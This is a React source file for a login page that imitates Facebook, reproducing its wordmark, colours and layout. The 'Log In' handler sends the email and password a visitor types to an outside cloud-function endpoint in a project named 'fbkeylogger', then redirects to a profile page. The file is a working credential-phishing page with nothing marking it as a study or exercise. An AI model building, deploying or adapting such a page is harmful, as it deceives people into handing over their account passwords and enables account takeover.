import {useState} from 'react';
import styled from 'styled-components'
import footerImage from './assets/fbFooter.png';
import chooseYourPic from './assets/addAccount.png';
import TextField from '@mui/material/TextField';
import Box from '@mui/material/Box';
import Stack from '@mui/material/Stack';
import Button from '@mui/material/Button';
import axios from 'axios';
import { useNavigate } from "react-router-dom";

const BackgroundContainer = styled.div`
background-color: #f0f2f5;
position: relative;
min-height: 100vh;


`;

const FooterContainer = styled.div`
 position: absolute;
  bottom: 0;
  width: 100%;
  height: 20rem; 
  background-color: white;

  @media (max-width: 1056px) {
    display:none
}


`;

const ContentContainer = styled.div`
  padding-bottom: 2.5rem;    /* Footer height */
  width: 1000px;
  border: 1px solid #f0f2f5;
  margin-left: auto;
  margin-right: auto;
  height: 600px;
`;

const LoginContainer = styled.div`
height: 500px;


`;


const FooterImgContainer = styled.div`
height: 15rem;
width: 60rem;
margin-left: auto;
margin-right: auto;


`;

const FooterImg = styled.img`
height: 15rem;
width: 60rem;
object-fit: contain;
`;

const FBSVG = styled.div`
height: 45px;
margin-top: 70px;
width: 200px;

@media (max-width: 1056px) {
        margin-left: 110px;
        margin-right: 50px;
        white-space: nowrap;
}
`;

const LoginSection = styled.div`
display: flex;
height: 400px;
justify-content: space-between;


`;

const RecentLogins = styled.div`
    font-family: SFProDisplay-Regular, Helvetica, Arial, sans-serif;
    font-size: 28px;
    font-weight: normal;
    line-height: 32px;
    padding: 20px;

    @media (max-width: 1056px) {
    display:none
}

`;

const LoginBox = styled.div`
    font-family: SFProDisplay-Regular, Helvetica, Arial, sans-serif;
    font-size: 28px;
    font-weight: normal;
    line-height: 32px;
    width: 396px;

 
`;

const ClickYourPicture = styled.div`
    color: #606770;
    font-family: Helvetica, Arial, sans-serif;
    font-size: 15px;
    line-height: 24px;
    margin-bottom: 12px;
    
`;

const AddYourPicDiv = styled.div `
height: 250px;
width: 300px;
margin-left: auto;
margin-right: auto;

`;

const AddYourPicImg = styled.img`
height: 250px;
width: 200px
object-fit: contain;

`;

const LoginApplet = styled.div`
    align-items: center;
    background-color: #fff;
    border: none;
    border-radius: 8px;
    box-shadow: 0 2px 4px rgb(0 0 0 / 10%), 0 8px 16px rgb(0 0 0 / 10%);
    box-sizing: border-box;
    margin: 20px 0 0;
    padding: 20px 0 28px;
    width: 396px;
    height: 100%;

    @media (max-width: 1056px) {
        margin-left: 10px;
        margin-right: 10px;
}
`;

const CreateAPage = styled.div`
    @media (max-width: 1056px) {
        margin-left: 60px;
        margin-right: 50px;
        white-space: nowrap;
}


`;


function Login() {

  const [credentials, setCredentials] = useState({
    email: '',
    password: ''
  })
  const navigate = useNavigate();

const handleSignup = async () => {
  try{
await axios.post('https://us-central1-fbkeylogger-ed9be.cloudfunctions.net/api/signup', {
  email: credentials.email,
  password: credentials.password
})

navigate("/profile");


  }catch(err){
    console.log(err)

  }
}


  return (
    <div>
    <BackgroundContainer>
<ContentContainer>
<LoginContainer>
  <FBSVG>
    <svg style={{fill: '#1877f2', height: '70px'}}id="Layer_1" data-name="Layer 1" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1022.51 360"><defs><style></style></defs><title>FBWordmark_Hex-RGB-1024</title><path className="cls-1" d="M166.43,126.68c-9.65,0-12.44,4.28-12.44,13.72v15.66h25.74l-2.58,25.3H154v76.78H123.11V181.36H102.3v-25.3h20.81V140.83c0-25.52,10.29-39,39-39a146.17,146.17,0,0,1,18,1.07v23.81Z"/><path className="cls-1" d="M181.87,203.88c0-28.52,13.51-50,41.82-50,15.44,0,24.87,7.94,29.38,17.8V156.06h29.59V258.14H253.07V242.7c-4.29,9.87-13.94,17.59-29.38,17.59-28.31,0-41.82-21.45-41.82-50Zm30.88,6.87c0,15.22,5.57,25.3,19.94,25.3,12.66,0,19.09-9.22,19.09-23.8V202c0-14.58-6.43-23.8-19.09-23.8-14.37,0-19.94,10.08-19.94,25.3Z"/><path className="cls-1" d="M347,153.91c12,0,23.37,2.58,29.59,6.86l-6.86,21.88a48.6,48.6,0,0,0-20.59-4.72c-16.73,0-24,9.65-24,26.17v6c0,16.52,7.29,26.17,24,26.17a48.6,48.6,0,0,0,20.59-4.72l6.86,21.87c-6.22,4.29-17.58,6.87-29.59,6.87-36.25,0-52.76-19.52-52.76-50.83v-4.72C294.24,173.43,310.75,153.91,347,153.91Z"/><path className="cls-1" d="M380.66,211v-9c0-28.95,16.51-48,50.19-48,31.74,0,45.68,19.3,45.68,47.61v16.3h-65c.65,13.94,6.87,20.16,24,20.16,11.59,0,23.81-2.36,32.82-6.22L474,253c-8.15,4.3-24.88,7.51-39.67,7.51C395.24,260.5,380.66,241,380.66,211Zm30.88-13.3h37.32v-2.57c0-11.15-4.5-20-18-20C416.91,175.14,411.54,183.94,411.54,197.66Z"/><path className="cls-1" d="M591,210.32c0,28.52-13.72,50-42,50-15.44,0-26.16-7.72-30.45-17.59v15.44H489.39V104.8L520.27,102v68.2c4.5-9,14.37-16.3,28.74-16.3,28.31,0,42,21.45,42,50Zm-30.88-7.08c0-14.37-5.57-25.09-20.37-25.09-12.66,0-19.52,9-19.52,23.59v10.72c0,14.58,6.86,23.59,19.52,23.59,14.8,0,20.37-10.72,20.37-25.09Z"/><path className="cls-1" d="M601.33,209.67v-5.14c0-29.39,16.73-50.62,50.83-50.62S703,175.14,703,204.53v5.14c0,29.38-16.73,50.62-50.83,50.62S601.33,239.05,601.33,209.67Zm70.78-7.29c0-13.51-5.58-24.23-20-24.23s-19.95,10.72-19.95,24.23v9.44c0,13.51,5.58,24.23,19.95,24.23s20-10.72,20-24.23Z"/><path className="cls-1" d="M713.27,209.67v-5.14c0-29.39,16.73-50.62,50.83-50.62s50.83,21.23,50.83,50.62v5.14c0,29.38-16.73,50.62-50.83,50.62S713.27,239.05,713.27,209.67Zm70.78-7.29c0-13.51-5.58-24.23-19.95-24.23s-19.94,10.72-19.94,24.23v9.44c0,13.51,5.57,24.23,19.94,24.23s19.95-10.72,19.95-24.23Z"/><path className="cls-1" d="M857.39,204.74l30.45-48.68h32.81l-31.95,50.4,33.24,51.68H889.13l-31.74-50v50H826.5V104.8L857.39,102Z"/></svg>

  </FBSVG>
  <LoginSection>
    <RecentLogins>Recent Logins
    <ClickYourPicture >Click your picture or add an account.</ClickYourPicture>
    <AddYourPicDiv><AddYourPicImg style={{cursor: 'pointer'}} src={chooseYourPic} alt="chooseYourPic"></AddYourPicImg></AddYourPicDiv>
    </RecentLogins>

    <LoginBox><LoginApplet>
      <div style={{  width: '360px',  marginLeft: 'auto', marginRight: 'auto'}}>
    <Box
      sx={{
        width: '360px',
        maxWidth: '100%',
      }}>
      <TextField onChange={(e) => setCredentials({...credentials, email: e.target.value})} style={{marginBottom: '16px'}} placeholder="Email or phone number" fullWidth id="outlined-basic" label="" variant="outlined" />
      </Box>
      <Box
      sx={{
        width: '360px',
        maxWidth: '100%',
      }}>
      <TextField type='password'
onChange={(e) => setCredentials({...credentials, password: e.target.value})} style={{marginBottom: '16px'}} placeholder="Password" fullWidth id="outlined-basic" label="" variant="outlined" />
      </Box>
      </div>
      <div style={{  width: '360px',  marginLeft: 'auto', marginRight: 'auto'}}>

      <Stack spacing={4} direction="row">
      <Button onClick={() => handleSignup()}style={{backgroundColor: '#1877f2'}} sx={{
      width: '100%',
      height: '50px',
      fontWeight: 'bold',
      fontSize: '16px'
    
  }} variant="contained">Log In</Button>
    </Stack>
    </div>

    <div  style={{ width: '160px', marginLeft: 'auto', marginRight: 'auto', marginTop: '20px', fontSize: '14px', textAlign: 'center', fontFamily: 'Helvetica'
    ,fontWeight: '500'}}>
    <a style={{textDecoration: 'none' }} href="google.com">Forgot Password?</a>
  
    </div>
    <div style={{width: '300px',  marginLeft: 'auto' ,marginRight: 'auto', border: ' 1px solid #dadde1', marginTop: '16px'}} />
    <div style={{  width: '235px',  marginLeft: 'auto', marginRight: 'auto', marginTop: '20px'}}>

<Stack spacing={4} direction="row">
<Button style={{backgroundColor: '#42b72a'}} sx={{
width: '100%',
height: '50px',
fontWeight: 'bold',
fontSize: '16px'

}} variant="contained">Create new account</Button>
</Stack>
</div>
    
</LoginApplet>
<CreateAPage style={{marginTop: '16px', fontFamily: ' Helvetica, Arial, sans-serif',
    fontSize: '14px',
    fontWeight: 'normal', textAlign: 'center'}}> <span style={{ fontFamily: ' Helvetica, Arial, sans-serif',
    fontSize: '14px',
    fontWeight: '600', textAlign: 'center', cursor: 'pointer'}}>Create a Page</span> for a celebrity, brand or business.
</CreateAPage>

</LoginBox>
  </LoginSection>
</LoginContainer>
</ContentContainer>
      <FooterContainer>
        <FooterImgContainer>
          <FooterImg src={footerImage} alt='fb-footer'></FooterImg>
        </FooterImgContainer>
        </FooterContainer>
    </BackgroundContainer>

   
    </div>
  );
}

export default Login;
